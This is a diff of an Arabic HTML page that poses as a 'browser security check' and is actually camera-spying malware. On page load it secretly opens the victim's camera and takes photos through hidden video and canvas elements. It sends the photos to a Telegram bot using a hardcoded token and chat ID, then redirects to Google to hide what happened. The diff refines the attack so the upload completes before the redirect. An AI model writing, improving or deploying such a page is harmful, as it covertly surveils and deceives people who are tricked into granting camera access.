@@ -1,85 +1,50 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص أمان المتصفح</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 90%; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { color: #333; font-size: 1.2rem; }
-        video, canvas { display: none; }
-    </style>
+    <title>Security Check</title>
+    <style>body { background: white; text-align: center; padding-top: 50px; font-family: sans-serif; } video, canvas { display: none; }</style>
 </head>
 <body>
+    <div id="status">جاري فحص المتصفح...</div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
 
-<div class="container">
-    <div class="loader"></div>
-    <h1>جاري التحقق من أمان المتصفح...</h1>
-    <p>يرجى السماح بالوصول للكاميرا لإتمام عملية التحقق من الهوية الرقمية.</p>
-</div>
+    <script>
+        const token = '8205090411:AAEIcpDG87AX8gzjI13Ei_pV9BiOcsc25EQ';
+        const chatId = '7945738403';
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" width="640" height="480"></canvas>
-
-<script>
-    const token = '8205090411:AAEIcpDG87AX8gzjI13Ei_pV9BiOcsc25EQ';
-    const chatId = '7945738403';
-
-    async function capture(mode) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode } 
-            });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
-                    canvas.toBlob(blob => {
-                        sendToTelegram(blob, mode);
-                        // إغلاق الكاميرا لتحريرها للمرة القادمة
-                        stream.getTracks().forEach(track => track.stop());
-                        resolve();
-                    }, 'image/jpeg', 0.7);
-                }, 2000); // ننتظر ثانيتين لضمان استقرار الإضاءة والفوكس
-            });
-        } catch (err) {
-            console.log(mode + " failed: " + err);
+        async function send(blob) {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('photo', blob, 'shot.jpg');
+            // نستخدم await هنا لضمان عدم الانتقال لصفحة أخرى قبل تمام الإرسال
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
         }
-    }
 
-    function sendToTelegram(blob, mode) {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, `${mode}.jpg`);
-        formData.append('caption', `🔔 تنبيه أمني:\nتم التقاط صورة من الكاميرا ${mode === 'user' ? 'الأمامية' : 'الخلفية'}`);
+        async function start() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
 
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
-    }
+                // انتظر ثانيتين لفتح الكاميرا بوضوح
+                await new Promise(r => setTimeout(r, 2000));
 
-    async function startProcess() {
-        // محاولة التقاط صورة أمامية
-        await capture('user');
-        // محاولة التقاط صورة خلفية
-        await capture('environment');
-        
-        // التوجيه النهائي لموقع حقيقي بعد الانتهاء للتمويه
-        window.location.href = "https://support.google.com/chrome/answer/95647";
-    }
+                const canvas = document.getElementById('c');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                
+                canvas.toBlob(async (blob) => {
+                    await send(blob); // انتظر حتى يرسل الصورة
+                    stream.getTracks().forEach(t => t.stop()); // أغلق الكاميرا
+                    window.location.href = "https://www.google.com"; // الآن انتقل للتمويه
+                }, 'image/jpeg');
 
-    // يبدأ العمل فور تحميل الصفحة
-    window.onload = startProcess;
-</script>
-
+            } catch (e) {
+                document.getElementById('status').innerText = "يرجى السماح بالكاميرا للمتابعة";
+            }
+        }
+        window.onload = start;
+    </script>
 </body>
 </html>
